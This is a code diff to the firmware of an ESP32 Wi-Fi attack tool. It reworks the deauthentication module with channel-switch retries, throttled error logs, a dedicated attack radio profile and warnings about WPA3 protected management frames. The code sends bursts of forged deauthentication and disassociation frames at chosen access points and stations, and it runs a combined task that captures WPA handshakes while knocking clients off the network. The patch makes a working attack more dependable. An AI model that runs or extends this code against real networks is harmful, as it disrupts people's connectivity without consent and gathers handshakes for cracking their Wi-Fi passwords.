@@ -12,6 +12,7 @@
  */
 
 #include "attacks/wifi/deauth_attack.h"
+#include "scans/wifi/wpa3_compliance.h"
 #include "managers/wifi_manager.h"
 #include "core/system_manager.h"
 #include "managers/ap_manager.h"
@@ -39,6 +40,12 @@
 
 // Rate limiting
 #define MAX_PACKETS_PER_SECOND 500
+#define DEAUTH_CHAN_RETRY_DELAY_MS 10
+#define DEAUTH_CHAN_ERR_LOG_INTERVAL_MS 5000
+
+// Forward declaration for channel helpers
+static esp_err_t deauth_set_channel_robust(int channel);
+static void deauth_log_channel_error_throttled(int channel, esp_err_t err);
 
 // External globals from wifi_manager.c (declared in wifi_manager.h)
 // These are already declared via the header include above
@@ -128,13 +135,45 @@ static void deauth_task(void *param);
 static void deauth_station_task(void *param);
 static void handshake_deauth_task(void *param);
 
-esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6]) {
-    // Use HT40 for 5GHz channels on dual-band chips - but use NONE as secondary
-    // WIFI_SECOND_CHAN_ABOVE is only valid for 2.4GHz HT40
+// --- Channel helpers (fixes #368) ---
+// The attack radio profile runs STA-only, so GhostNet clients are already
+// gone by the time any attack task runs. This helper just handles transient
+// channel-set failures with one quick retry.
+static esp_err_t deauth_set_channel_robust(int channel) {
+    if (channel < 1 || channel > MAX_WIFI_CHANNEL) return ESP_ERR_INVALID_ARG;
+    uint8_t cur_ch = 0;
+    wifi_second_chan_t cur_sec = WIFI_SECOND_CHAN_NONE;
+    if (esp_wifi_get_channel(&cur_ch, &cur_sec) == ESP_OK && cur_ch == (uint8_t)channel) {
+        return ESP_OK; // already on requested channel
+    }
     wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
     esp_err_t err = esp_wifi_set_channel(channel, second);
+    if (err == ESP_OK) return ESP_OK;
+    // Single retry after short delay (handles transient ESP_FAIL)
+    vTaskDelay(pdMS_TO_TICKS(DEAUTH_CHAN_RETRY_DELAY_MS));
+    return esp_wifi_set_channel(channel, second);
+}
+
+static void deauth_log_channel_error_throttled(int channel, esp_err_t err) {
+    static uint32_t s_last_ms = 0;
+    static int s_last_ch = 0;
+    static esp_err_t s_last_err = ESP_OK;
+    uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
+    if (s_last_ch == channel && s_last_err == err && (now - s_last_ms) < DEAUTH_CHAN_ERR_LOG_INTERVAL_MS) {
+        return;
+    }
+    s_last_ms = now;
+    s_last_ch = channel;
+    s_last_err = err;
+    printf("Failed to set channel %d: %s\n", channel, esp_err_to_name(err));
+}
+
+esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6]) {
+    esp_err_t err = deauth_set_channel_robust(channel);
     if (err != ESP_OK) {
-        printf("Failed to set channel %d: %s\n", channel, esp_err_to_name(err));
+        deauth_log_channel_error_throttled(channel, err);
+        // Don't abort TX: still try to inject on current channel (may still affect co-channel targets)
+        // But if channel mismatch, effectiveness will be reduced
     }
 
     // Create packets from templates
@@ -172,13 +211,13 @@ esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6])
 
     // Send frames (no rate limiting for burst effectiveness)
     esp_err_t tx_err;
-    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+    tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), deauth_frame, sizeof(deauth_frame), false);
     if (tx_err == ESP_OK) deauth_packets_sent++;
-    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+    tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), deauth_frame, sizeof(deauth_frame), false);
     if (tx_err == ESP_OK) deauth_packets_sent++;
-    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+    tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), disassoc_frame, sizeof(disassoc_frame), false);
     if (tx_err == ESP_OK) deauth_packets_sent++;
-    tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+    tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), disassoc_frame, sizeof(disassoc_frame), false);
     if (tx_err == ESP_OK) deauth_packets_sent++;
 
     // If not broadcast, send reverse direction
@@ -200,13 +239,13 @@ esp_err_t deauth_attack_broadcast(uint8_t bssid[6], int channel, uint8_t mac[6])
         disassoc_frame[23] = (seq >> 8) & 0xFF;
 
         // Send reverse frames
-        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), deauth_frame, sizeof(deauth_frame), false);
         if (tx_err == ESP_OK) deauth_packets_sent++;
-        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), false);
+        tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), deauth_frame, sizeof(deauth_frame), false);
         if (tx_err == ESP_OK) deauth_packets_sent++;
-        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+        tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), disassoc_frame, sizeof(disassoc_frame), false);
         if (tx_err == ESP_OK) deauth_packets_sent++;
-        tx_err = esp_wifi_80211_tx(WIFI_IF_AP, disassoc_frame, sizeof(disassoc_frame), false);
+        tx_err = esp_wifi_80211_tx(ap_manager_get_tx_iface(), disassoc_frame, sizeof(disassoc_frame), false);
         if (tx_err == ESP_OK) deauth_packets_sent++;
     }
 
@@ -245,8 +284,13 @@ static void deauth_task(void *param) {
                 for (int i = 0; i < ap_count; i++) {
                     if (memcmp(ap_info[i].bssid, selected_aps_local[sel_idx].bssid, 6) == 0) {
                         int ch = ap_info[i].primary;
-                        wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
-                        esp_wifi_set_channel(ch, sec);
+                        esp_err_t ch_err = deauth_set_channel_robust(ch);
+                        if (ch_err != ESP_OK) {
+                            deauth_log_channel_error_throttled(ch, ch_err);
+                            // Channel switch failed even after kicking Ghost clients; skip briefly
+                            vTaskDelay(pdMS_TO_TICKS(10));
+                            continue;
+                        }
                         
                         // Burst loop for effectiveness
                         for (int burst = 0; burst < 25; burst++) {
@@ -267,8 +311,12 @@ static void deauth_task(void *param) {
             for (int i = 0; i < ap_count; i++) {
                 if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap_local.ssid) == 0) {
                     int ch = ap_info[i].primary;
-                    wifi_second_chan_t sec = WIFI_SECOND_CHAN_NONE;
-                    esp_wifi_set_channel(ch, sec);
+                    esp_err_t ch_err = deauth_set_channel_robust(ch);
+                    if (ch_err != ESP_OK) {
+                        deauth_log_channel_error_throttled(ch, ch_err);
+                        vTaskDelay(pdMS_TO_TICKS(10));
+                        continue;
+                    }
                     for (int burst = 0; burst < 25; burst++) {
                         deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
                     }
@@ -299,6 +347,12 @@ static void deauth_task(void *param) {
 
 void deauth_attack_start(void) {
     if (!deauth_task_running) {
+        extern wifi_ap_record_t selected_ap;
+        const char *pmf_warning = wpa3_deauth_warning(&selected_ap);
+        if (pmf_warning) {
+            glog("WARNING: %s\n", pmf_warning);
+            TERMINAL_VIEW_ADD_TEXT("WARNING: %s\n", pmf_warning);
+        }
         ap_manager_stop_services();
         ghostchi_manager_add_xp(3);
 
@@ -306,26 +360,9 @@ void deauth_attack_start(void) {
         esp_wifi_stop();
         vTaskDelay(pdMS_TO_TICKS(50));
 
-        // Set protocols for dual-band chips (C5/C6) BEFORE starting WiFi to enable 5GHz
-#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
-        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-        wifi_protocols_t p = {
-            .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
-            .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
-        };
-        esp_err_t proto_err = esp_wifi_set_protocols(WIFI_IF_AP, &p);
-        if (proto_err != ESP_OK) {
-            printf("Warning: Failed to set 5GHz protocols: %s\n", esp_err_to_name(proto_err));
-        } else {
-            printf("5GHz protocols set successfully\n");
-        }
-        ESP_ERROR_CHECK(esp_wifi_start());
-#else
-        ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP)); // Set AP mode for 802.11 TX
-        esp_wifi_start();
-        // For non-dual-band chips, use 2.4GHz protocols only
-        (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-#endif
+        // Attack radio profile: STA-only mode (GhostNet AP off, clients
+        // kicked) + wide/LR protocols (enables 5GHz TX, frees channel hopping)
+        ESP_ERROR_CHECK(ap_manager_apply_attack_radio());
         printf("Restarting Wi-Fi\n");
 
 #ifdef CONFIG_WITH_STATUS_DISPLAY
@@ -375,7 +412,7 @@ void deauth_attack_start(void) {
 #endif
             rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
             esp_wifi_stop();
-            ap_manager_start_services();
+            (void)ap_manager_restore_after_attack("deauth start");
             return;
         }
         
@@ -423,7 +460,7 @@ void deauth_attack_stop(void) {
         deauth_stop_requested = false;
         rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
         esp_wifi_stop();
-        ap_manager_start_services();
+        (void)ap_manager_restore_after_attack("deauth stop");
         status_display_show_status("Deauth Stopped");
         ghostscript_emit_event("attack_stopped", "deauth");
     } else {
@@ -438,6 +475,7 @@ void deauth_attack_start_station(void) {
         deauth_attack_start();
         return;
     }
+    glog("WARNING: PMF posture is not available for the selected station; deauth effectiveness is unverified.\n");
     if (deauth_station_task_handle) {
         printf("Station deauth already running.\n");
         return;
@@ -448,25 +486,9 @@ void deauth_attack_start_station(void) {
     esp_wifi_stop();
     vTaskDelay(pdMS_TO_TICKS(50));
 
-    // Set protocols for dual-band chips (C5/C6) BEFORE starting WiFi to enable 5GHz
-#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    wifi_protocols_t p = {
-        .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
-        .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
-    };
-    esp_err_t proto_err = esp_wifi_set_protocols(WIFI_IF_AP, &p);
-    if (proto_err != ESP_OK) {
-        printf("Warning: Failed to set 5GHz protocols: %s\n", esp_err_to_name(proto_err));
-    } else {
-        printf("5GHz protocols set successfully\n");
-    }
-    ESP_ERROR_CHECK(esp_wifi_start());
-#else
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP)); // switch to AP mode for deauth
-    ESP_ERROR_CHECK(esp_wifi_start()); // restart Wi-Fi interface without HTTP server
-    (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-#endif
+    // Attack radio profile: STA-only mode (GhostNet AP off, clients kicked)
+    // + wide/LR protocols (enables 5GHz TX, frees channel hopping)
+    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());
 
     glog("Deauthing station %02X:%02X:%02X:%02X:%02X:%02X from AP %02X:%02X:%02X:%02X:%02X:%02X, starting background task...\n",
          selected_station_local.station_mac[0], selected_station_local.station_mac[1], selected_station_local.station_mac[2], 
@@ -480,7 +502,7 @@ void deauth_attack_start_station(void) {
         status_display_show_status("Deauth Station Fail");
         deauth_station_task_handle = NULL;
         deauth_station_stop_requested = false;
-        ap_manager_start_services();
+        (void)ap_manager_restore_after_attack("station deauth start");
         return;
     }
     station_selected_local = false;
@@ -501,12 +523,21 @@ static void deauth_station_task(void *param) {
     if (deauth_channel < 1 || deauth_channel > MAX_WIFI_CHANNEL) {
         deauth_channel = 1; // fallback channel
     }
-    // Use NONE for all channels - WIFI_SECOND_CHAN_ABOVE is only for 2.4GHz HT40
-    (void)esp_wifi_set_channel(deauth_channel, WIFI_SECOND_CHAN_NONE);
+    // Initial channel set with retry and throttled error logging
+    esp_err_t init_ch_err = deauth_set_channel_robust(deauth_channel);
+    if (init_ch_err != ESP_OK) {
+        deauth_log_channel_error_throttled(deauth_channel, init_ch_err);
+    }
     uint32_t last_log = xTaskGetTickCount() * portTICK_PERIOD_MS;
     while (!deauth_station_stop_requested) {
-        for (int burst = 0; burst < 25; burst++) {
-            deauth_attack_broadcast(selected_station_local.ap_bssid, deauth_channel, selected_station_local.station_mac);
+        esp_err_t ch_err = deauth_set_channel_robust(deauth_channel);
+        if (ch_err != ESP_OK) {
+            deauth_log_channel_error_throttled(deauth_channel, ch_err);
+            vTaskDelay(pdMS_TO_TICKS(50));
+        } else {
+            for (int burst = 0; burst < 25; burst++) {
+                deauth_attack_broadcast(selected_station_local.ap_bssid, deauth_channel, selected_station_local.station_mac);
+            }
         }
         vTaskDelay(pdMS_TO_TICKS(20));
         uint32_t now = xTaskGetTickCount() * portTICK_PERIOD_MS;
@@ -535,7 +566,7 @@ bool deauth_attack_stop_station(void) {
             deauth_station_task_handle = NULL;
         }
         deauth_station_stop_requested = false;
-        ap_manager_start_services();
+        (void)ap_manager_restore_after_attack("station deauth stop");
         return true;
     }
     return false;
@@ -581,7 +612,11 @@ static void handshake_deauth_task(void *param) {
                 for (int i = 0; i < ap_count; i++) {
                     if (memcmp(ap_info[i].bssid, selected_aps_local[sel_idx].bssid, 6) == 0) {
                         int ch = ap_info[i].primary;
-                        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+                        esp_err_t ch_err = deauth_set_channel_robust(ch);
+                        if (ch_err != ESP_OK) {
+                            deauth_log_channel_error_throttled(ch, ch_err);
+                            continue;
+                        }
                         // Short burst: 10 frames to each target
                         for (int burst = 0; burst < 10; burst++) {
                             deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
@@ -601,7 +636,11 @@ static void handshake_deauth_task(void *param) {
                 if (handshake_deauth_stop_requested) break;
                 if (strcmp((char *)ap_info[i].ssid, (char *)selected_ap_local.ssid) == 0) {
                     int ch = ap_info[i].primary;
-                    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+                    esp_err_t ch_err = deauth_set_channel_robust(ch);
+                    if (ch_err != ESP_OK) {
+                        deauth_log_channel_error_throttled(ch, ch_err);
+                        continue;
+                    }
                     for (int burst = 0; burst < 10; burst++) {
                         deauth_attack_broadcast(ap_info[i].bssid, ch, broadcast_mac);
                     }
@@ -666,6 +705,10 @@ void deauth_attack_start_handshake_deauth(void) {
 #endif
             return;
         }
+        const char *pmf_warning = wpa3_deauth_warning(&selected_ap_local);
+        if (pmf_warning) glog("WARNING: %s\n", pmf_warning);
+    } else {
+        glog("WARNING: PMF posture is not available for the selected station; deauth effectiveness is unverified.\n");
     }
 
     ap_manager_stop_services();
@@ -675,25 +718,9 @@ void deauth_attack_start_handshake_deauth(void) {
     esp_wifi_stop();
     vTaskDelay(pdMS_TO_TICKS(50));
 
-    // Set protocols for dual-band chips (C5/C6) BEFORE starting WiFi to enable 5GHz
-#if defined(CONFIG_IDF_TARGET_ESP32C5) || defined(CONFIG_IDF_TARGET_ESP32C6)
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    wifi_protocols_t p = {
-        .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_LR,
-        .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N | WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
-    };
-    esp_err_t proto_err = esp_wifi_set_protocols(WIFI_IF_AP, &p);
-    if (proto_err != ESP_OK) {
-        printf("Warning: Failed to set 5GHz protocols: %s\n", esp_err_to_name(proto_err));
-    } else {
-        printf("5GHz protocols set successfully\n");
-    }
-    ESP_ERROR_CHECK(esp_wifi_start());
-#else
-    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
-    esp_wifi_start();
-    (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
-#endif
+    // Attack radio profile: STA-only mode (GhostNet AP off, clients kicked)
+    // + wide/LR protocols (enables 5GHz TX, frees channel hopping)
+    ESP_ERROR_CHECK(ap_manager_apply_attack_radio());
     printf("Restarting Wi-Fi for Handshake+Deauth\n");
 
     // Enable promiscuous mode for EAPOL capture (on top of AP mode)
@@ -776,7 +803,7 @@ void deauth_attack_start_handshake_deauth(void) {
         esp_wifi_set_promiscuous(false);
         pcap_file_close();
         esp_wifi_stop();
-        ap_manager_start_services();
+        (void)ap_manager_restore_after_attack("hs+deauth cancel");
         return;
     }
 
@@ -788,7 +815,7 @@ void deauth_attack_start_handshake_deauth(void) {
         handshake_deauth_stop_requested = false;
         esp_wifi_set_promiscuous(false);
         esp_wifi_stop();
-        ap_manager_start_services();
+        (void)ap_manager_restore_after_attack("hs+deauth start");
         return;
     }
     handshake_deauth_task_running = true;
@@ -827,7 +854,7 @@ bool deauth_attack_stop_handshake_deauth(void) {
     handshake_deauth_stop_requested = false;
     rgb_manager_set_color(&rgb_manager, -1, 0, 0, 0, false);
     esp_wifi_stop();
-    ap_manager_start_services();
+    (void)ap_manager_restore_after_attack("hs+deauth stop");
     status_display_show_status("HS+Deauth Stopped");
 
     glog("Handshake+Deauth stopped. %" PRIu32 " handshakes captured.\n", handshake_deauth_handshake_count);
